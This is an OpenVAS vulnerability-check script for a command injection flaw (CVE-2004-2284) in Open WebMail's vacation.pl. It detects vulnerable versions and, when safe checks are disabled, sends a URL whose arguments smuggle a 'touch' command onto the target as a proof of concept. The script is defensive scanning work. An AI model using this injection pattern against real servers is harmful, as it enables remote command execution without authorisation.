# OpenVAS Vulnerability Test
# $Id: openwebmail_vacation_input_validation.nasl 3362 2016-05-20 11:19:10Z antu123 $
# Description: Open WebMail vacation.pl Arbitrary Command Execution
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The target is running at least one instance of Open WebMail in which
the vacation.pl component fails to sufficiently validate user input. 
This failure enables remote attackers to execute arbitrary programs on
a target using the privileges under which the web server operates. 
For further information, see :

  http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:04.txt

If safe_checks are disabled, OpenVAS attempts to create the file
/tmp/openvas_openwebmail_vacation_input_validation on the target.";

tag_solution = "Upgrade to Open WebMail version 2.32 20040629 or later.";

if (description) {
  script_id(12637);
  script_version("$Revision: 3362 $");
  script_tag(name:"last_modification", value:"$Date: 2016-05-20 13:19:10 +0200 (Fri, 20 May 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2004-2284");
  script_bugtraq_id(10637);
  script_xref(name:"OSVDB", value:"7474");

  name = "Open WebMail vacation.pl Arbitrary Command Execution";
  script_name(name);
 
  summary = "Checks for Arbitrary Command Execution flaw in Open WebMail's vacation.pl";
  script_summary(summary);
 
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Gain a shell remotely";
  script_family(family);

  script_dependencies("global_settings.nasl", "openwebmail_detect.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (debug_level) display("debug: checking for Arbitrary Command Execution flaw in vacation.pl in Open WebMail on ", host, ":", port, ".\n");

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/openwebmail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # nb: intermediate releases of 2.32 from 20040527 - 20040628 are 
    #     vulnerable, as are 2.32 and earlier releases.
    pat = "^(1\.|2\.([0-2]|3[01]|32$|32 20040(5|6[01]|62[0-8])))";
    if (ereg(pattern:pat, string:ver)) {
      # At this point, we know the target is running a potentially vulnerable
      # version. Still, we need to verify that vacation.pl is accessible since
      # one workaround is to simply remove the script from the CGI directory.
      url = string(dir, "/vacation.pl");
      # If safe_checks is disabled, I'll try to create 
      # /tmp/openvas_openwebmail_vacation_input_validation as a PoC 
      # although AFAIK there's no programmatic way to verify this worked 
      # since the script doesn't display results of any commands that might
      # be run.
      if (safe_checks() == 0) url += "?-i+-p/tmp+-ftouch%20/tmp/openvas_openwebmail_vacation_input_validation|";
      if (debug_level) display("debug: retrieving ", url, "...\n");

      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (isnull(res)) exit(0);           # can't connect
      if (debug_level) display("debug: res =>>", res, "<<\n");

      if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
        security_message(port);
        exit(0);
      }
    }
  }
}
